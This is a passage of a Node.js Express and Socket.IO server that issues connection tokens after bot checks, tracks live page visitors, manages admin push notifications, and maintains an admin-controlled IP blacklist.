      console.log(`[TOKEN] Turnstile=FAIL, FP=OK(${fpResult.score}), BH=OK(${bhResult.score}), IP=${ip} - ALLOWED (both fallbacks passed)`);
    } else {
      // One or both failed = likely bot - blacklist this IP
      blacklistIP(ip, 'bot_detected_insufficient_checks');
      console.log(`[TOKEN] BLOCKED+BLACKLISTED: Turnstile=FAIL, FP=${fpResult.valid?'OK':'FAIL'}(${fpResult.score}), BH=${bhResult.valid?'OK':'FAIL'}(${bhResult.score}), IP=${ip}`);
      return res.json({ success: false, reason: 'bot_detected', redirect: botRedirectUrl || '' });
    }
  }
  
  // 8. Generate connection token
  const token = crypto.randomBytes(32).toString('hex');
  connectionTokens.set(token, { ip, createdAt: now, used: false });
  
  res.json({ success: true, token });
});

// === Page View Tracking (lightweight, no socket) ===
const pageViewers = new Map(); // sessionId -> { lastPing, ip }
const PAGE_VIEW_TIMEOUT = 45000; // 45 seconds without ping = left

// Cleanup stale page viewers every 15 seconds
setInterval(() => {
  const now = Date.now();
  for (const [sid, data] of pageViewers) {
    if (now - data.lastPing > PAGE_VIEW_TIMEOUT) {
      pageViewers.delete(sid);
    }
  }
  // Broadcast updated count to admins
  broadcastSiteVisitors();
}, 15000);

function broadcastSiteVisitors() {
  const count = pageViewers.size;
  io.sockets.sockets.forEach(s => {
    if (s.isAdmin) {
      s.emit('siteVisitors:update', { count });
    }
  });
}

const pagePingRateLimit = new Map(); // ip -> { count, resetAt }
const MAX_PAGE_SESSIONS_PER_IP = 5; // Max 5 sessions per IP

app.post('/api/page-ping', (req, res) => {
  const sessionId = req.body?.sessionId;
  if (!sessionId || typeof sessionId !== 'string' || sessionId.length > 100) {
    return res.status(400).json({ error: 'Invalid session' });
  }
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  
  // Rate limit: max pings per IP per minute
  const now = Date.now();
  const rateData = pagePingRateLimit.get(ip) || { count: 0, resetAt: now + 60000 };
  if (now > rateData.resetAt) {
    rateData.count = 0;
    rateData.resetAt = now + 60000;
  }
  rateData.count++;
  pagePingRateLimit.set(ip, rateData);
  if (rateData.count > 60) { // Max 60 pings/minute per IP (normal is ~2-4/min)
    return res.status(429).json({ error: 'Too many requests' });
  }
  
  // Limit sessions per IP
  const sessionsFromIP = Array.from(pageViewers.values()).filter(v => v.ip === ip).length;
  const isExistingSession = pageViewers.has(sessionId);
  if (!isExistingSession && sessionsFromIP >= MAX_PAGE_SESSIONS_PER_IP) {
    return res.status(429).json({ error: 'Too many sessions' });
  }
  
  pageViewers.set(sessionId, { lastPing: now, ip });
  broadcastSiteVisitors();
  res.json({ ok: true });
});

app.post('/api/page-leave', (req, res) => {
  const sessionId = req.body?.sessionId;
  if (sessionId) {
    pageViewers.delete(sessionId);
    broadcastSiteVisitors();
  }
  res.json({ ok: true });
});

app.get('/api/site-visitors', (req, res) => {
  res.json({ count: pageViewers.size });
});

// REST API Routes
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

// Protected: requires admin password as Bearer token or ?key= query param
app.get("/api/visitors", requireAdminAuth, (req, res) => {
  res.json(savedVisitors);
});

// Protected: requires admin password
app.get("/api/stats", requireAdminAuth, (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// FCM Token Registration - Protected
app.post("/api/fcm/register", requireAdminAuth, (req, res) => {
  const { token } = req.body;
  if (!token || typeof token !== 'string' || token.length < 10 || token.length > 500) {
    return res.status(400).json({ error: 'Valid token required' });
  }
  
  // Add token if not already registered
  if (!fcmTokens.includes(token)) {
    fcmTokens.push(token);
    saveFcmTokens();
    console.log(`FCM token registered: ${token.substring(0, 20)}... (total: ${fcmTokens.length})`);
  }
  res.json({ success: true, message: 'Token registered' });
});

// FCM Token Unregister - Protected
app.post("/api/fcm/unregister", requireAdminAuth, (req, res) => {
  const { token } = req.body;
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Token required' });
  
  fcmTokens = fcmTokens.filter(t => t !== token);
  saveFcmTokens();
  console.log(`FCM token unregistered: ${token.substring(0, 20)}...`);
  res.json({ success: true, message: 'Token unregistered' });
});

// Test push notification - Protected
app.get("/api/fcm/test", requireAdminAuth, async (req, res) => {
  try {
    await sendPushNotification('اختبار الإشعارات', 'هذا إشعار تجريبي من لوحة التحكم');
    res.json({ success: true, message: `Test notification sent to ${fcmTokens.length} devices` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// FCM Status - Protected
app.get("/api/fcm/status", requireAdminAuth, (req, res) => {
  res.json({
    firebaseInitialized: !!firebaseAdmin,
    tokenCount: fcmTokens.length,
    tokens: fcmTokens.map(t => t.substring(0, 30) + '...')
  });
});

// === Admin Blacklist Management ===
app.get("/api/blacklist", requireAdminAuth, (req, res) => {
  const list = [];
  const now = Date.now();
  ipBlacklist.forEach((info, ip) => {
    list.push({
      ip,
      ...info,
      active: now < info.blockedUntil,
      remainingMinutes: Math.max(0, Math.round((info.blockedUntil - now) / 60000))
    });
  });
  // Sort: active first, then by strikes descending
  list.sort((a, b) => (b.active - a.active) || (b.strikes - a.strikes));
  res.json({ total: list.length, active: list.filter(x => x.active).length, blacklist: list });
});

app.post("/api/blacklist/add", requireAdminAuth, (req, res) => {
  const { ip, duration } = req.body; // duration in hours
  if (!ip) return res.status(400).json({ error: 'IP required' });
  const hours = duration || 24;
  ipBlacklist.set(ip, {
    blockedUntil: Date.now() + hours * 60 * 60 * 1000,
    strikes: (ipBlacklist.get(ip)?.strikes || 0) + 1,
    reason: 'manual_admin_ban',
    lastBlocked: new Date().toISOString()
  });
  saveBlacklist();
  res.json({ success: true, message: `IP ${ip} blacklisted for ${hours} hours` });
});

app.delete("/api/blacklist/:ip", requireAdminAuth, (req, res) => {
  const ip = req.params.ip;
  if (ipBlacklist.has(ip)) {
    ipBlacklist.delete(ip);
    saveBlacklist();
    res.json({ success: true, message: `IP ${ip} removed from blacklist` });
  } else {
    res.json({ success: false, message: 'IP not found in blacklist' });
  }
});

app.delete("/api/blacklist", requireAdminAuth, (req, res) => {
  const count = ipBlacklist.size;
  ipBlacklist.clear();
  saveBlacklist();
  res.json({ success: true, message: `Cleared ${count} entries from blacklist` });
});

// Idle check timer - every 10 seconds, check for visitors idle > 30 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 15 seconds (faster cleanup during attacks)
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
          connectedVisitors: visitors.size,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 15000);

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
